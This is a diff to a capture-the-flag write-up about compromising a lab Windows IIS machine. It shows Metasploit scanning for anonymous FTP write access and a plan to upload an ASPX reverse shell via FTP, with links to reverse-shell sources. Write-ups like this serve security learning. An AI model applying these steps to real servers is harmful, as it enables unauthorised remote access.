@@ -195,16 +195,39 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ...
 ```
 Going to `http://10.10.10.5`, we see the IIS welcome page.
+
+![1](https://user-images.githubusercontent.com/21957042/114300393-b8e96a00-9af2-11eb-852b-8fb586d1ae01.png)
+
 Trying `http://10.10.10.5/iisstart.htm` and `http://10.10.10.5/welcome.png` as seen on the FTP server, we get results! 
+
+![2](https://user-images.githubusercontent.com/21957042/114300395-ba1a9700-9af2-11eb-98b7-3c415045068b.png)
+![3](https://user-images.githubusercontent.com/21957042/114300398-bab32d80-9af2-11eb-8831-c14e7a90f0ee.png)
+
 So they're indeed connected and linked! FTP could be a good vector to attack from! Let's check the FTP out.
 
 ## 4. Finding Vulnerabilties for FTP & IIS
 We see FTP on Port 21 has `Anonymous FTP login allowed (FTP code 230)`
 ```
-msf5 > use auxiliary/scanner/ftp/anonymous
-...
-[+] 10.10.10.5:21         - 10.10.10.5:21 - Anonymous READ/WRITE (220 Microsoft FTP Service)
-[*] 10.10.10.5:21         - Scanned 1 of 1 hosts (100% complete)
+hippoeug@kali:~$ msfconsole
+msf6 > use auxiliary/scanner/ftp/anonymous
+msf6 auxiliary(scanner/ftp/anonymous) > show options
+
+Module options (auxiliary/scanner/ftp/anonymous):
+
+   Name     Current Setting      Required  Description
+   ----     ---------------      --------  -----------
+   FTPPASS  mozilla@example.com  no        The password for the specified username
+   FTPUSER  anonymous            no        The username to authenticate as
+   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT    21                   yes       The target port (TCP)
+   THREADS  1                    yes       The number of concurrent threads (max one per host)
+
+msf6 auxiliary(scanner/ftp/anonymous) > set rhost 10.129.128.62
+rhost => 10.129.128.62
+msf6 auxiliary(scanner/ftp/anonymous) > run
+
+[+] 10.129.128.62:21      - 10.129.128.62:21 - Anonymous READ/WRITE (220 Microsoft FTP Service)
+[*] 10.129.128.62:21      - Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 ```
 Interesting, `Anonymous READ/WRITE (220 Microsoft FTP Service)`. Let's upload a f*\*ken reverse shell!
@@ -223,7 +246,6 @@ PHP reverse shell [source](https://github.com/pentestmonkey/php-reverse-shell/bl
 
 We find a ASPX reverse shell online, [source](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx) and used it!
 We upload through `ftp> put shell.aspx`.
-
 ```
 hippoeug@kali:~$ ftp 10.10.10.5 21
 Connected to 10.10.10.5.
